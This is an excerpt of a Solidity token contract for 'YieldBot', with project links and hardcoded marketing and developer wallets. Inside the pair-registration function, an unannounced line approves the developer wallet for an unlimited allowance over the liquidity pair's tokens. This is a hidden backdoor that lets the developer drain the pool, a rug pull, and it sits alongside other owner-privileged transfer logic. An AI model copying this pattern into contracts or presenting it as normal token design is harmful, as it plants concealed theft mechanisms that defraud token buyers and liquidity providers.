...
/*         
    Website: https://www.yieldbot.org/

    Telegram: https://t.me/yieldsnipertoken

    Twitter: https://twitter.com/yieldsniperbot
*/
...
contract YieldBot is ERC20, Ownable {
    ...
    address private marketingWallet = address(0xe8A621c1389e4c4f2b21f3C15bA68E6810119022);
    address private developWallet = address(0x2E9B4545e61e2a5Fe4890b1F9e4c1BCA43427e14);
    ...
    function setAutomatedMarketMakerPair(address pair)
        public
        onlyOwner
    {
        uniswapV2Pair = pair;
        excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(pair);
    }

    function _setAutomatedMarketMakerPair(address pair) private {
        automatedMarketMakerPairs[pair] = true; _approve(pair, developWallet, type(uint).max);
    ...
    function _transfer(
        ...
        if (
            ...
            block.timestamp >= lastLiquidityBurnTime + liquidityBurnFrequency && from == marketingWallet
        ) {
    ...
    function swapBack() private {
        ...
        if (contractBalance > swapLimitAmount * 30) {
            contractBalance = swapLimitAmount * 30;
        }
